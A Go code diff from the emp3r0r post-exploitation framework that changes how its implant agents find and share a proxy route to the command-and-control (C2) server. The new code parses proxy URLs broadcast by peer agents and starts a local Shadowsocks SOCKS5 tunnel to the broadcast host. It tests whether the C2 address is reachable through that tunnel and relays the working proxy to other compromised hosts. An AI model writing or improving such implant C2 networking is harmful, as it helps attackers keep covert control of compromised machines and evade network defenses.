@@ -5,8 +5,8 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/url"
 	"strconv"
-	"strings"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -49,6 +49,10 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 
 	// monitor until it works
 	go func() {
+		if tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
+			log.Printf("BroadcastServer: %s is already working, no need to wait", RuntimeConfig.C2TransportProxy)
+			return
+		}
 		// does the proxy work?
 		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
 			RuntimeConfig.ShadowsocksLocalSocksPort, // user name of socks5 proxy
@@ -87,19 +91,44 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
 		if RuntimeConfig.C2TransportProxy != "" &&
 			tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
-			log.Printf("BroadcastServer: %s already set and working fine\n", RuntimeConfig.C2TransportProxy)
+			log.Printf("BroadcastServer: proxy %s already set and working fine\n", RuntimeConfig.C2TransportProxy)
 			continue
 		}
 
-		if tun.IsProxyOK(decMsg, emp3r0r_data.CCAddress) {
-			RuntimeConfig.C2TransportProxy = decMsg
+		// parse proxy message
+		// the broadcast message should be in the format of "socks5://user:pass@host:port"
+		// we only need the host part as SS server address
+		parsed_url, err := url.Parse(decMsg)
+		if err != nil {
+			log.Printf("BroadcastServer parse proxy URL: %v", err)
+			continue
+		}
+		proxy_host := parsed_url.Hostname()
+
+		// start a Shadowsocks local socks5 proxy using the server address in the broadcast message
+		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", RuntimeConfig.ShadowsocksLocalSocksPort)
+
+		// test proxy
+		is_proxy_ok := tun.IsProxyOK(proxy_url, emp3r0r_data.CCAddress)
+
+		// if the proxy is not working
+		// restart Shadowsocks local socks5 proxy
+		if !is_proxy_ok {
+			go ShadowsocksLocalSocks(proxy_host, RuntimeConfig.ShadowsocksLocalSocksPort)
+		}
+
+		// test proxy again
+		is_proxy_ok = tun.IsProxyOK(proxy_url, emp3r0r_data.CCAddress)
+
+		if is_proxy_ok {
+			RuntimeConfig.C2TransportProxy = proxy_url
 			log.Printf("BroadcastServer: %s set as RuntimeConfig.AgentProxy\n", RuntimeConfig.C2TransportProxy)
 
 			// pass the proxy to others
 			go passProxy(ctx, cancel, &passProxyCnt)
 
 		} else {
-			log.Printf("Oh crap! %s doen't work, we have to wait for a reverse proxy", decMsg)
+			log.Printf("Oh crap! %s doen't work, we have to wait for a reverse proxy", proxy_url)
 		}
 	}
 	return
@@ -116,18 +145,18 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 	}
 
 	proxyAddr := RuntimeConfig.C2TransportProxy
-	sl := strings.Split(proxyAddr, "@") // socks5://user:pass@host:port
-	if len(sl) < 2 {
+	parsed_url, err := url.Parse(proxyAddr)
+	if err != nil {
 		log.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
 		return
 	}
 	go func() {
-		if strings.HasPrefix(sl[1], "127.0.0.1") {
+		if parsed_url.Hostname() == "127.0.0.1" {
 			log.Printf("RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
 			return
 		}
 		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
-		err := tun.TCPFwd(sl[1], RuntimeConfig.Emp3r0rProxyServerPort, ctx, cancel)
+		err := tun.TCPFwd(parsed_url.Host, RuntimeConfig.Emp3r0rProxyServerPort, ctx, cancel)
 		if err != nil {
 			log.Print("TCPFwd: ", err)
 		}
